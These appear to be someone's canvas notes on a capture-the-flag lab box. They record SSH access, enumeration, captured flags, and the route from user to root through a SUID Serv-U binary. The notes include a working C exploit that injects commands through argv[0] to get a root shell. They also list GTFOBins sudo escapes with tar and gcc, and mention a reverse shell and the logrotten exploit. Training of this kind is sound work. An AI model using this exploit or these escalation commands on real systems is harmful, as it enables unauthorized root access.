		{"id":"0cc4f33d9e1c8b44","type":"text","text":"# Home directory check\n\nls -la\ncat local.txt\ncat /home/love/Desktop/user.txt\n\nFlags found early:\nlocal.txt: 359e1c99fc17ffba6d09d1fad5d22e4e\nuser.txt: cd38ac698c0d793a5236d01003f692b0\n\nBox already fairly open hai, most home dirs rwxrwxrwx, world-writable/readable. Loose permissions is a hint that box is misconfigured or previously modified.","x":3623,"y":2840,"width":560,"height":360,"color":"4"},
		{"id":"89fecbc490fefc0b","type":"text","text":"# find command for txt files\n\nfind / -type f -iname *.txt 2>/dev/null\n\nThen filtered out noise with -not -path exclusions for /usr, /proc, /sys, /snap, /var/lib.\n\nFiltered noise (system docs, licenses, egg-info files) to leave actual relevant files: local.txt, user.txt, robots.txt.","x":4380,"y":2890,"width":560,"height":260,"color":"3"},
		{"id":"2014e95da807af19","type":"text","text":"SUID binaries via: find / -perm -4000 -type f\n\nStandard system SUID binaries (mount, passwd, sudo, su, ssh-keysign, pkexec etc) were all expected/normal.\n\nInteresting one:\n/usr/local/Serv-U/Serv-U\n\nThis is NOT a normal system binary, it is third party Serv-U FTP server software with the SUID bit set. Custom or unusual SUID binaries are always priority targets since vendor software often has weak input validation or undocumented CLI flags.","x":3623,"y":3440,"width":560,"height":350,"color":"1"},
		{"id":"39b09e34f4916db0","type":"text","text":"- `ls -la` home dir → `local.txt` present (world-readable, root-owned)\n- `cat ~/.bash_history` → mostly wiped (`rm .bash_history` x2); remnants show old `su -`, `ssh root@127.0.0.1`, `pkexec users-admin` attempts\n- `find / -iname \"*.txt\"` → located `local.txt` and `Desktop/user.txt`\n- `find / -writable` → `/var/www/html` **and** the Serv-U install dir are world-writable 🚩\n- `find / -perm -4000` (SUID) → **`/usr/local/Serv-U/Serv-U` is SUID root** ⭐ ← eventual privesc vector\n- `getcap -r /` → nothing exploitable (gnome-keyring, mtr-packet, gst-ptp-helper only)","x":4660,"y":3315,"width":860,"height":225},
		{"id":"0afe1566192a257a","type":"text","text":"- `ssh love@192.168.116.211` with known creds → low-priv shell (`uid=1000 love`)\n- `su root` → **authentication failure** (root pw unknown/not reused)\n- No `sudo` rights configured for `love` directly\n- Captured: `local.txt` and `Desktop/user.txt`","x":4660,"y":4095,"width":860,"height":160},
		{"id":"94de55f3fffeb684","type":"text","text":"**Vuln:** `/usr/local/Serv-U/Serv-U` is SUID root. When run with `-prepareinstallation`, it passes `argv[0]` unsanitized into a shell command — classic argv injection.\n\n**C wrapper exploit:**\n```c\n#include <stdio.h>\n#include <unistd.h>\n#include <errno.h>\n\nint main() {\n    // Malicious argv[0] breaks quoting, injects commands\n    char *vuln_args[] = {\n        \"\\\"; id; echo 'Spawning Root Shell...'; /bin/sh; \\\"\",\n        \"-prepareinstallation\",\n        NULL\n    };\n    int ret_val = execv(\"/usr/local/Serv-U/Serv-U\", vuln_args);\n    if (ret_val == -1) {\n        printf(\"Exploit failed. Error code: %d\\n\", errno);\n    }\n    return 0;\n}\n```\n\n**Steps:**\n1. `gcc /tmp/servu_privesc.c -o /tmp/servu_privesc`\n2. `chmod +x /tmp/servu_privesc`\n3. `/tmp/servu_privesc` → drops into a **root shell**\n4. Verified with `id` → `uid=0(root) gid=0(root) groups=0(root),...`","x":4660,"y":4375,"width":860,"height":725},
		{"id":"258a1391c9b2aced","type":"text","text":"Found `/var/www/.bash_history` (readable, ~6.5KB) — documents an **earlier compromise of www-data**, essentially a cheat sheet for the box:\n\n1. **Web app recon:** `election/admin/ajax`, `election/admin/components`, `election/admin/inc`, `election/lib/homeAPI.php`, `election/admin/logs/system.log`\n2. **Reverse shell** dropped as www-data (`write.sh` → renamed `z.sh`)\n3. **`sudo -l`** revealed passwordless GTFOBins entries:\n   - `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`\n   - `sudo gcc -wrapper /bin/sh,-s .`\n   - also tried `sudo -E wget $URL -O $LFILE` (env-preserving LFILE trick)\n4. **Kernel/log privesc:** pulled `LinEnum.sh`, flagged `logrotate` → exploited with **logrotten (CVE-2019-15718)** against `/tmp/log/pwnme.log` + crafted `payloadfile` → root\n5. Also tried **CVE-2020-8635** (Serv-U exploit PoC) against ports 22/5466 — several failed attempts logged\n6. Eventually `su love` to pivot and grab `user.txt`\n\n➡️ Confirms **two independent privesc paths** exist on this box: `logrotten` (log-based) and the Serv-U SUID binary (used below).","x":4700,"y":3620,"width":860,"height":420},
		{"id":"4c7bc94b6d1c5e5e","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260726150108.png","x":5687,"y":2979,"width":395,"height":400},
		{"id":"7761367525587afa","type":"file","file":"Offsec  Play-Ground/media/Pasted image 20260726150127.png","x":5820,"y":3540,"width":400,"height":272},
		{"id":"556bead2832e7764","type":"text","text":"| Flag           | Location                      | Value                              |\n| -------------- | ----------------------------- | ---------------------------------- |\n| User (local)   | `/home/love/local.txt`        | `359e1c99fc17ffba6d09d1fad5d22e4e` |\n| User (desktop) | `/home/love/Desktop/user.txt` | `cd38ac698c0d793a5236d01003f692b0` |\n| Root           | `/root/proof.txt`             | `4e119b54c27fec162c357798b5dff771` |\n\n✅ Full chain **user → root** completed.","x":4660,"y":5140,"width":860,"height":140}
